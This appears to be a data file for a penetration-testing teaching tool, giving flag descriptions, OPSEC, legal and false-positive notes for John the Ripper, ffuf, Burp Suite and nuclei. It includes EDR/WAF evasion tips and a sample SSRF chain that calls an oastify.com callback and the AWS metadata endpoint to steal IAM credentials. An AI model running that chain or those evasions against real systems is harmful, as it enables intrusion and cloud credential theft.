Modern cloud consideration: KeePass databases, 1Password exports, and similar credential stores captured during an engagement may contain OAuth tokens, AWS access keys, and Azure service principal secrets with their own authorization boundaries and expiry windows. Using these to access cloud infrastructure requires explicit cloud-scope authorization in the rules of engagement. Many organizations treat cloud credential abuse as a separate legal matter from on-premises compromise, and some cloud providers (AWS, Azure) log API calls in ways that create evidence trails independent of your engagement's agreed-upon logging scope.
false_positives: John reports 'No password hashes loaded' when the hash format doesn't match what --format specifies, or when the hash file has Windows-style CRLF line endings that corrupt the hash string. Run 'dos2unix hashfile.txt' before cracking if you extracted the file on a Windows system. John will silently skip malformed lines rather than erroring, so you may think you're cracking when nothing is actually loaded — always verify with 'john --list=formats | grep <expected_format>' and check the 'Loaded N password hashes' line at startup.

The --show flag reads from the potfile, not from re-cracking. If you moved or deleted the potfile (e.g., used a custom --pot path and then lost the file), john --show will report 0 cracked passwords even though the session succeeded. The cracked password is gone. Always copy the potfile to a safe location immediately after a successful crack.

John's auto-detection of hash formats is unreliable when multiple formats produce valid-looking hashes for the same string. NTLM and MD4 hashes are identical in structure; john may auto-detect the wrong one and report 'no hashes loaded' or crack against the wrong algorithm, producing false negatives. Always force --format=NT for NTLM hashes extracted from Windows systems.

With --fork, john splits the keyspace across processes but each process writes to the same potfile. On NFS-mounted or network-backed storage, concurrent writes can corrupt the potfile, causing some cracked passwords to be silently lost. Use --fork only on local storage and verify the potfile size is non-zero after the session.

John's 'session completed' message means the wordlist was exhausted — it does NOT mean the password was not cracked. If the password was cracked mid-session, john reports it inline and continues. Operators who kill john early after seeing a crack may miss additional cracked hashes if multiple hashes were loaded. Always run --show after any session, even interrupted ones, to check the potfile for partial results.

ffuf.description: Fuzz Faster U Fool — extremely fast web fuzzer written in Go. Used for directory brute forcing, parameter fuzzing, virtual host discovery, and API endpoint enumeration. Often faster than gobuster with more flexible filtering.
ffuf.teach_intro: FFUF replaces the keyword FUZZ in a URL/header/body with wordlist entries. It's incredibly versatile — fuzz directories, GET/POST parameters, headers, cookies, or anything. The filtering options (-fc, -fs, -fw, -fl) let you hide noise and surface only interesting responses.

-u.label: URL with FUZZ
-u.desc: Target URL. Place FUZZ where you want to inject wordlist entries.
-u.teach:
FUZZ is a placeholder. It can go anywhere in the URL: /FUZZ, /?param=FUZZ, in headers. Multiple FUZZ positions are possible.

URL with FUZZ keyword as injection point

-w.label: Wordlist
-w.desc: Wordlist file path. Use W1:FILE syntax for multiple wordlists.
-w.teach:
For dir fuzzing: dirb/common.txt (fast) or dirbuster/directory-list-2.3-medium.txt (thorough). For params: burp-parameter-names.txt from seclists.

Wordlist path

-fc.label: Filter Status Code
-fc.desc: Hide responses with specific HTTP status codes: -fc 404,400
-fc.teach:
Filter out 404s to see only valid paths. Add -fc 403 to hide forbidden too, or keep 403s — they mean the path exists.

Filter HTTP codes: -fc 404,500

-fs.label: Filter Size
-fs.desc: Hide responses of specific byte size: -fs 1234 (hides the 'not found' page size).
-fs.teach:
Most 'not found' pages are the same size. Find out the size of the 404 page with curl, then filter it out. Everything else is interesting.

Filter by response size: -fs 1234

-fw.label: Filter Word Count
-fw.desc: Hide responses with specific word count.
-fw.teach:
Alternative to -fs when the server varies 404 sizes. Word count is more stable than byte count for detecting real content.

Filter by word count

-mc.label: Match Status Code
-mc.desc: Only show responses with specific status codes: -mc 200,301,302,403
-mc.teach:
Whitelist approach vs blacklist (-fc). Only show what you care about. 200 = accessible, 301 = redirects, 403 = exists but forbidden.

Match HTTP codes: -mc 200,301,302,403

-t.label: Threads
-t.teach:
FFUF defaults to 40 threads which is already fast. -t 80+ on reliable servers. Reduce to 10 for rate-limited targets.

Threads: -t 50

-H.label: Custom Header
-H.desc: Add custom HTTP header: -H 'Host: FUZZ' for vhost fuzzing.
-H.teach:
Virtual host fuzzing! Change the Host header to discover hidden vhosts on the same IP. Internal apps often lurk here.

Add header: -H 'Cookie: session=abc'

-d.label: POST Data
-d.desc: Send POST request with fuzz point in body.
-d.teach:
POST body fuzzing finds parameter vulnerabilities. FUZZ in the username or password field can reveal SQLi, XSS, or logic flaws.

POST data: -d 'user=FUZZ&pass=password'

-o.label: Output File
-o.teach:
JSON output is parseable — pipe it into jq for filtering. HTML output is great for reports.

Output file: -o results.json

-recursion.label: Recursive Mode
-recursion.teach:
Recursion finds /admin/config/, /api/v1/users/ etc. Set -recursion-depth 2-3 to avoid infinite loops.

Recurse into found directories

-e.label: Extensions
-e.teach:
Extensions turn 'admin' into 'admin.php', 'admin.bak', 'admin.txt'. Backup files (.bak, .old, ~) are goldmines.

Extensions: -e .php,.html,.txt,.bak

-of.label: -of
-of.teach: Output format: json, csv, ecsv, md

output_read.meaning: High response size differences usually indicate real content
Filter noise first: run once, note the common response size, add -fs to hide it
403s are interesting — directory exists but is blocked
FUZZ can go anywhere in the URL — parameters, headers, paths
Use multiple wordlists by specifying -w multiple times with :FUZZ labels

opsec_notes: BEGINNER — ffuf hammers the target with hundreds or thousands of HTTP requests in rapid succession. Every request lands in the web server's access log (Apache: /var/log/apache2/access.log, nginx: /var/log/nginx/access.log, IIS: C:\inetpub\logs\LogFiles\W3SVC1\). A defender doing even a casual grep for your IP will see a wall of 404s with sequential wordlist entries. Default thread count (-t 40) makes this unmistakable.

Each HTTP request carries a default User-Agent of 'Fuzz Faster U Fool' — this string is trivially detectable in any WAF, SIEM, or IDS with a single signature rule. Always override with -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' or a browser-realistic UA. Burp Collaborator logs, Cloudflare, and AWS WAF all alert on this UA out of the box.

CUTTING-EDGE 2025 — Modern WAFs (Cloudflare, Imperva, AWS WAF v2) use ML-based anomaly scoring on request velocity, response-code distribution, and header fingerprinting. A ffuf run at -t 40 with default settings will breach rate-limit thresholds and trigger bot-detection challenges within seconds. Mitigation: use -rate to cap requests-per-second (e.g., -rate 10), randomize delay with -p '0.1-0.5', and rotate source IPs via a SOCKS5 proxy chain (-x socks5://127.0.0.1:1080).

CUTTING-EDGE 2025 — CrowdStrike Falcon and SentinelOne both instrument process creation via ETW-TI (Event Tracing for Windows — Threat Intelligence provider). When ffuf is launched from a compromised Windows host (e.g., post-exploitation pivot), the process tree anomaly — cmd.exe or powershell.exe spawning a Go binary with high-entropy command-line arguments containing 'FUZZ' or long wordlist paths — scores high on behavioral ML models. Prefer launching ffuf from a Linux pivot or wrapping execution in a LOLBin chain to reduce parent-child anomaly scoring.

CONCRETE ARTIFACT — Web Application Firewalls and reverse proxies (nginx, HAProxy, Cloudflare) emit structured logs with request rate per source IP. A defender watching Splunk or Elastic with a query like 'index=web_access status=404 | stats count by src_ip | where count > 200' will surface your scan in under a minute. The artifact is the 404-storm: hundreds of identical-structure requests differing only in the path segment.

Recursive mode (-recursion) multiplies request volume exponentially and dramatically increases the chance of triggering account lockout on HTTP Basic Auth endpoints or rate-limit bans. Always confirm recursion depth (-recursion-depth) is bounded and that the target's rules of engagement explicitly permit recursive enumeration before enabling it.

legal_notes: US CFAA (18 U.S.C. § 1030): Sending thousands of HTTP requests to enumerate paths on a web server you do not own and have not received explicit written authorization to test constitutes unauthorized access under the CFAA, regardless of whether any vulnerability is found. 'Publicly accessible' does not mean 'authorized to fuzz.' The authorization must be explicit, written, and scoped to the specific domain and IP range.

Rules of Engagement scope: Confirm that the target domain and all subdomains you intend to fuzz are explicitly listed in the signed scope document. Wildcard scopes (e.g., '*.corp.com') may or may not include API subdomains, CDN origins, or third-party SaaS integrations that resolve under the parent domain. Fuzzing an out-of-scope third-party host (e.g., a Salesforce or Okta subdomain) is a scope violation even if the DNS record points to corp.com.

Cloud-hosted targets: If the target runs behind AWS CloudFront, Azure Front Door, or Cloudflare, your fuzzing traffic hits the CDN provider's infrastructure before reaching the customer origin. Some CDN ToS explicitly prohibit automated scanning of their networks even when the customer has authorized testing of their application. Verify with the client whether the CDN provider has been notified or whether a direct-to-origin IP bypass is available and authorized for the engagement.
false_positives: Load balancers and CDNs (Cloudflare, Akamai, AWS CloudFront) return a uniform 403 or custom error page for ALL unrecognized paths, and that error page has a consistent size. If you don't calibrate with -fs against a known-404 response size first, ffuf will report every wordlist entry as a hit. Always make one manual request to a nonsense path (e.g., /asdfjkl123) before running, note the response size, and add it to -fs.

Soft 404s: Many modern frameworks (Laravel, Rails, Django) return HTTP 200 with a 'Page Not Found' HTML body rather than a true 404 status. ffuf's default matcher (-mc 200) will flag every one of these as a valid discovery. Mitigation: use -fs or -fw to filter the known soft-404 response size/word-count, or use -fr with a regex matching the 'not found' string in the body.

Redirect chains: A 301 redirect to /login for every unauthenticated path will make every wordlist entry appear as a 301 hit. If -mc includes 301 and you haven't filtered by size, your results will be entirely noise. Check whether the redirect target is uniform (same Location header for all hits) before treating 301s as meaningful discoveries.

Virtual host fuzzing false positives: When fuzzing VHosts with -H 'Host: FUZZ.corp.com', a wildcard DNS entry (*.corp.com → same IP) combined with a default vhost that returns 200 for all hostnames will make every wordlist entry appear valid. Calibrate by checking the response size for a nonsense hostname first and filtering that size with -fs.

Rate-limited or throttled responses: Some applications return 429 Too Many Requests with a body that differs in size from normal responses. If -mc includes 429 or the rate-limit response happens to match your match criteria, you'll get false positives for paths that may not exist. Monitor the Errors counter in ffuf's progress line and spot-check a sample of results manually before treating the full output as ground truth.
ffuf.teach_alt: Fast web fuzzer — directory, parameter, header, and vhost discovery

burpsuite.description: The premier web application security testing platform. Intercepts, modifies, and replays HTTP/HTTPS traffic. Includes: Proxy, Repeater, Intruder (fuzzer), Scanner, Decoder, Sequencer, and Comparer. Used by nearly every professional web pen tester.
burpsuite.teach_intro: Burp Suite sits between your browser and the web server, capturing every request and response. You can pause requests, modify them, replay them, and send them to specialized tools. The Proxy tab shows live traffic. Repeater lets you modify and resend. Intruder automates fuzzing.

--project-file.label: Project File
--project-file.desc: Load/create a project file to save work between sessions.
--project-file.teach: Project files save all captured traffic, findings, and notes. Always create a project file for real engagements.

--config-file.label: Config File
--config-file.desc: Load Burp configuration from JSON file.
--config-file.teach: Config files let you pre-configure proxy settings, scope, and scan options. Great for consistent engagement setup.

Proxy.label: Intercept Mode
Proxy.desc: The core feature — intercept HTTP/HTTPS between browser and server.
Proxy.teach: Set your browser proxy to 127.0.0.1:8080. All traffic flows through Burp. Toggle Intercept to pause/modify requests before they reach the server.

Repeater.label: Repeater Tab
Repeater.desc: Modify and resend individual HTTP requests manually. Right-click any request → Send to Repeater.
Repeater.example: Right-click request → Send to Repeater → Modify → Send
Repeater.teach: Repeater is where you probe for vulnerabilities. Change parameter values, inject payloads, see exactly how the server responds. Manual testing at its finest.

Intruder.label: Intruder (Fuzzer)
Intruder.desc: Automated fuzzing/brute forcing. Mark payload positions with § symbols. Right-click → Send to Intruder.
Intruder.example: Send login request to Intruder, mark password field, set payload list, attack
Intruder.teach: Intruder attack types: Sniper (one position, one list), Battering Ram (same payload everywhere), Pitchfork (multiple lists in sync), Cluster Bomb (all combos).

Decoder.label: Decoder Tab
Decoder.desc: Encode/decode: Base64, URL, HTML, hex, gzip, JWT etc.
Decoder.example: Paste token → Decode as Base64 → Decode as URL → see plaintext
Decoder.teach: JWT tokens, session cookies, and hidden fields are often encoded. Decode them to find embedded data like user IDs, permissions, or expiry timestamps.

Comparer.label: Comparer Tab
Comparer.desc: Diff two requests or responses to spot differences.
Comparer.example: Send two responses to Comparer → compare word/byte differences
Comparer.teach: Compare successful vs failed login responses. Even tiny differences reveal logic flaws — different word counts, error messages, or response times.

opsec_notes: BEGINNER NOISE: Every request Burp Proxy intercepts appears in the target web server's access logs with your real source IP. If you're testing without a VPN or proxy chain in front of Burp, the server sees your machine's public IP in every log line — e.g., Apache logs at /var/log/apache2/access.log will show '203.0.113.42 - - [14/May/2026:10:23:11 +0000] "GET /admin HTTP/1.1" 200 4523'. Assume every request is logged.

CONCRETE ARTIFACT — WAF/SIEM VISIBILITY: Burp Intruder's default threading produces a burst of near-identical HTTP requests with sequential or wordlist-derived payloads within milliseconds of each other. ModSecurity (rule 913100+) and Cloudflare WAF will trigger on this pattern. The SIEM artifact is a spike in 4xx responses from a single source IP within a short time window — defenders call this 'error rate anomaly'. Throttle Intruder to 1-2 threads with randomized delays (100-500ms) to flatten the spike.

CUTTING-EDGE 2025-2026 — PROCESS TREE ANOMALY: When Burp Suite is launched from a terminal or script (e.g., bash -> java -> burpsuite.jar), CrowdStrike Falcon's process tree analysis flags the parent-child relationship if java.exe spawns network connections to non-standard ports or if the Burp CA certificate is written to the system trust store programmatically. On Windows, Defender for Endpoint (MDE) generates DeviceNetworkEvents telemetry for every connection Burp's embedded Chromium browser makes — correlating process PID with destination IP/port. Avoid launching Burp from a suspicious parent process on a monitored endpoint.

CUTTING-EDGE 2025-2026 — TLS FINGERPRINTING (JA3/JA4): Burp Suite's internal HTTP client produces a distinctive JA3/JA4 TLS fingerprint because it uses a specific Java TLS stack (JSSE) with a fixed cipher suite order. Cloudflare, Akamai, and enterprise reverse proxies running Zeek or Suricata with JA3 rules will fingerprint Burp's CONNECT tunnel and flag it as a known security tool. In 2025, JA4 fingerprinting is increasingly deployed in XDR platforms (SentinelOne Singularity, Palo Alto Cortex). Mitigation: route through a custom upstream proxy or use Burp's 'TLS pass-through' for sensitive hosts, but understand this breaks interception.

CERTIFICATE TRUST STORE ARTIFACT: Installing the Burp CA certificate into a browser or OS trust store leaves a forensic artifact. On Windows, the certificate appears in certmgr.msc under 'Trusted Root Certification Authorities' with issuer 'PortSwigger CA'. On Linux, it appears in /usr/local/share/ca-certificates/ or the Firefox profile's cert9.db. Incident responders and EDR file-integrity monitoring (FIM) will flag unexpected root CA additions — Sysmon EID 13 (RegistryValueSet) captures the Windows certificate store write at HKLM\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\.

SCOPE BLEED VIA BROWSER HISTORY: Burp's embedded browser and configured external browser will capture ALL traffic, including out-of-scope requests to CDNs, analytics endpoints, and third-party APIs embedded in the target application. If your engagement scope is strictly 'app.target.com', Burp will still intercept and log requests to 'cdn.jquery.com' or 'analytics.google.com' that the app loads. This creates legal exposure if you replay or fuzz those out-of-scope requests. Use Burp's 'Target > Scope' settings to restrict interception and always verify scope before running Scanner or Intruder.

sample_outputs.explanation: This is a raw HTTP POST request — exactly what the browser sends to the server when you click 'Login'. Key fields to understand: (1) 'Content-Type: application/x-www-form-urlencoded' means the body is URL-encoded key=value pairs, not JSON. (c) Note the 'security=low' cookie — this is DVWA-specific, but in real apps look for role/privilege indicators in cookies that you might be able to tamper with.

Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyJ9.SIGNATURE
Content-Type: application/json
Content-Length: 89

{"webhook_url": "http://a1b2c3d4e5f6.oastify.com/ssrf-test", "events": ["order.created"]}

--- Collaborator interaction received ---
HTTP interaction from: 54.239.28.85
GET /ssrf-test HTTP/1.1
Host: a1b2c3d4e5f6.oastify.com
User-Agent: python-requests/2.31.0

--- Pivot: resend with AWS IMDSv1 target ---
{"webhook_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "events": ["order.created"]}

HTTP/2 200 OK
Content-Type: application/json
{"result": "webhook_registered", "debug_response": "app-ec2-role\n"}
sample_outputs.explanation: Breaking down what happened: (1) The Collaborator ping confirms blind SSRF — the server made an outbound HTTP request to our controlled domain. The source IP 54.239.28.85 is an AWS EC2 address, confirming the app runs on AWS. The X-Forwarded-For header 10.0.1.47 reveals the internal IP of the application server. (2) The pivot to 169.254.169.254 (AWS IMDSv1 metadata endpoint) succeeded — the debug_response field leaked the IAM role name 'app-ec2-role'. This is a critical finding: IMDSv1 has no authentication and is reachable from any process on the EC2 instance. (3) NEXT STEPS: (a) Send a follow-up request with webhook_url set to 'http://169.254.169.254/latest/meta-data/iam/security-credentials/app-ec2-role' to retrieve the actual AccessKeyId, SecretAccessKey, and Token. (b) Feed those credentials into the AWS CLI or Pacu (cloud exploitation framework) to enumerate IAM permissions: 'aws sts get-caller-identity' then 'pacu' with the stolen keys. (c) Check if IMDSv2 (token-required) is enforced — if the app is using IMDSv1, this is a reportable misconfiguration independent of the SSRF. (d) Document the full chain: SSRF -> IMDS -> credential theft -> potential IAM privilege escalation. This maps to a critical CVSS finding. Note: the 'debug_response' field in the API response suggests the developers left debug output enabled in production — flag this separately as an information disclosure issue.

legal_notes: US CFAA BOUNDARY: Burp Suite's interception capability means you are actively reading, modifying, and replaying computer communications. Under 18 U.S.C. § 1030, intercepting or modifying traffic to/from a system you are not authorized to test — even passively — constitutes unauthorized access. 'I was just looking' is not a defense. Your written authorization (Rules of Engagement, Statement of Work, or bug bounty program scope) must explicitly cover the specific hosts and ports you are intercepting. Burp's project file (.burp) contains a full record of every intercepted request and is discoverable evidence — store it securely and delete it per your data handling agreement.

AUTHORIZATION SCOPE — IN-SCOPE HOSTS ONLY: Burp will intercept ALL traffic your browser generates, including requests to third-party CDNs, OAuth providers, payment processors, and analytics platforms embedded in the target application. These third parties are almost certainly NOT in your engagement scope. Before running Scanner or Intruder, configure Target > Scope with explicit include rules (e.g., '^app\.target\.com$') and enable 'Drop all out-of-scope requests' in Proxy options. Fuzzing or scanning an out-of-scope third party — even accidentally — can void your authorization and expose you to CFAA liability for that third party's systems.

CLOUD/MODERN-APP CONSIDERATION: If your target application uses OAuth 2.0, SAML, or OpenID Connect for authentication, Burp's interception of the authorization code or SAML assertion constitutes interception of a credential. Some bug bounty programs and engagement scopes explicitly prohibit 'account takeover' techniques even when testing authentication flows. Additionally, if the application is hosted on a cloud provider (AWS, Azure, GCP), your testing traffic may traverse the provider's infrastructure — cloud provider terms of service (AWS Acceptable Use Policy, Azure Terms) require you to notify them for penetration testing against their infrastructure. Confirm your client has filed the appropriate cloud provider pen test notification before testing cloud-hosted targets.
false_positives: HTTPS INTERCEPTION FAILURES LOOK LIKE APP BUGS: If Burp's CA certificate is not trusted by the browser or application, HTTPS connections will fail with SSL errors. Operators sometimes misread this as the application being 'broken' or 'blocking scanners' when the real cause is a missing or expired Burp CA cert. Verify by checking Proxy > Options > CA Certificate and confirming the cert is installed in the browser's trust store. Mobile apps with certificate pinning will also fail here — the app is working correctly, not broken.

INTRUDER RATE LIMITING LOOKS LIKE VULNERABILITY ABSENCE: If the target has aggressive rate limiting or account lockout, Intruder attacks will return 429 Too Many Requests or locked-account responses after the first few payloads. Operators may conclude 'no valid credentials exist' when the real finding is that rate limiting prevented the test from completing. Always check response codes and response lengths in Intruder results — a cluster of 429s means you need to throttle and retry, not that the attack failed.

SCANNER FALSE POSITIVES ON REFLECTED INPUT: Burp Scanner (Pro) will flag reflected input as XSS even when the reflection occurs inside a JavaScript string context where the payload is not executable, or inside an HTML comment. Always manually verify Scanner findings in Repeater — confirm the payload actually executes in a browser, not just that it appears in the response body. Reflected-but-unexploitable findings waste client remediation time and damage your report's credibility.

RESPONSE DIFFING IN REPEATER MISSES STATE-DEPENDENT BEHAVIOR: When replaying a request in Repeater, the server's response may differ from the original browser-captured response because session state has changed (e.g., a CSRF token was consumed, a one-time code expired, or the server tracks request sequence). Operators sometimes conclude a parameter is 'not injectable' because the replayed request returns an error, when the real issue is stale session state. Always refresh your session token before replaying sensitive authenticated requests.

COLLABORATOR DNS INTERACTIONS ARE NOT ALWAYS SSRF: Burp Collaborator will record DNS lookups for your payload domain even when the server is simply doing a DNS prefetch, URL validation check, or safe-browsing lookup — not a full HTTP request. A DNS-only Collaborator interaction does NOT confirm SSRF exploitability; it only confirms the server resolved the hostname. You need a full HTTP interaction (with request headers and body) to confirm the server made an outbound HTTP request that you can leverage for SSRF exploitation.

nuclei.description: Fast, template-based vulnerability scanner. Runs thousands of community-maintained YAML templates against targets. Checks for CVEs, misconfigurations, exposed panels, default credentials, XSS, SQLi, SSRF, and more. ProjectDiscovery's flagship scanner.
nuclei.teach_intro: Nuclei uses YAML templates — each one describes how to detect a specific vulnerability. The community maintains 6000+ templates covering every CVE you can think of. It's the fastest way to scan for known vulnerabilities across a large number of targets.

-u.label: Single URL Target
-u.teach:
Single target mode. Nuclei runs all matching templates and reports findings with severity ratings.

Target URL

-l.label: Target List
-l.desc: File containing list of URLs to scan.
-l.teach:
Mass scanning — feed nuclei a list of URLs from subfinder/httpx output. Covers entire web attack surface at once.

List of targets: -l targets.txt

-t.label: Specific Template
-t.desc: Run a specific template or directory of templates.
-t.teach:
Run specific CVE templates for targeted testing. nuclei -t cves/ tests all CVE templates. nuclei -t exposures/ finds exposed sensitive data.

Template directory/file: -t http/cves/

-s.label: Severity Filter
-s.desc: Filter by severity: critical, high, medium, low, info.
-s.teach: Start with critical and high. Info templates generate a lot of noise. Focus on actionable findings first.

-tags.label: Tag Filter
-tags.teach:
Tags let you target specific vuln classes. -tags rce finds remote code execution opportunities. -tags default-login checks default credentials.

Filter by tags: -tags rce,sqli,xss,cve

-c.label: Concurrency
-c.desc: Number of parallel template executions. Default 25.
-c.teach:
Higher concurrency = faster scans. On stable targets use -c 50-100. Reduce for rate-limited or sensitive targets.

Concurrency: -c 25

-o.label: Output File
-o.teach:
Always save output. Nuclei findings with CVE numbers are ready-made report evidence.

Output file: -o nuclei_output.txt

-json.label: JSON Output
-json.desc: Output results in JSON format for parsing.
-json.teach: JSON output integrates with other tools and SIEM platforms. Each finding includes template name, severity, matched value, and URL.

-rl.label: Rate Limit
-rl.teach: Rate limiting prevents overwhelming the target and triggering WAF blocks. Use -rl 10-50 for sensitive production targets.

-headless.label: Headless Browser
-headless.desc: Enable headless Chrome for JavaScript-rendered targets.
-headless.teach: Single-page apps and React/Angular frontends need headless mode. Nuclei uses Chrome to render JS before scanning.

output_read.meaning: a confirmed critical vuln — exploit this first
[info] findings are not vulnerabilities — just enumeration (interesting files, tech stack)
Template ID tells you exactly what was found — google it for details
what specific string or condition triggered the match
False positives happen — verify critical/high findings manually

opsec_notes: BEGINNER — Nuclei hammers targets with hundreds of HTTP requests in rapid succession. Every web server access log will show your source IP making GET/POST requests to paths like /.git/config, /wp-admin/setup-config.php, /actuator/env, and /api/swagger.json within seconds of each other. This is immediately obvious to any analyst watching Apache/Nginx logs or a SIEM with web anomaly rules.

CONCRETE ARTIFACT — Nuclei's default User-Agent is 'nuclei/3.x.x (https://projectdiscovery.io)' and appears verbatim in web server access logs (e.g., /var/log/nginx/access.log, /var/log/apache2/access.log, Windows IIS logs at C:\inetpub\logs\LogFiles\). WAFs with signature rules (ModSecurity, Cloudflare, AWS WAF) have explicit rules matching this string. Always override with -H 'User-Agent: Mozilla/5.0 ...' on real engagements.

CUTTING-EDGE 2025 — CrowdStrike Falcon's Indicator of Attack (IOA) engine scores process trees. When nuclei spawns as a child of bash or cmd.exe with command-line arguments containing '-l targets.txt -t cves/ -c 50', the high-concurrency flag combined with a template-directory argument produces a command-line entropy pattern that Falcon's ML model flags as automated scanning behavior. Falcon telemetry captures the full argv array — the '-update-templates' flag in particular is a near-unique behavioral fingerprint.

CUTTING-EDGE 2025 — Microsoft Defender for Endpoint (MDE) on Windows correlates network flow telemetry with process ancestry. Nuclei running under a compromised user context will generate thousands of outbound TCP connections logged via ETW-TI (Event Tracing for Windows Threat Intelligence). MDE's network inspection layer captures destination IPs, ports, and HTTP headers per-connection. On hardened Win11 24H2 endpoints, kernel callback registration by MDE's driver means even a renamed nuclei.exe binary is caught via image-load hash and PE section entropy scoring — renaming the binary does not evade this.

RATE LIMITING IS BOTH OPSEC AND SAFETY — Default concurrency (-c 25) and no rate limit will saturate small web servers, crash fragile IoT admin panels, and trigger volumetric DDoS protections on CDNs. On real engagements, use -rl 10 (10 req/sec) and -c 5 minimum. Tripping a CDN rate limit causes a 429 storm that appears in the client's WAF dashboard and will end your engagement. This is also a scope violation if the rules of engagement prohibit denial-of-service conditions.

TEMPLATE SELECTION REDUCES NOISE — Running all 6000+ templates (-t nuclei-templates/) against a production target generates an enormous log footprint and risks triggering active defenses. On stealth engagements, scope templates to the confirmed technology stack: '-tags apache,php,wordpress' or '-t cves/2024/' limits requests to relevant probes only. Pair with '-stats' to monitor request volume in real time and abort if rate spikes unexpectedly.
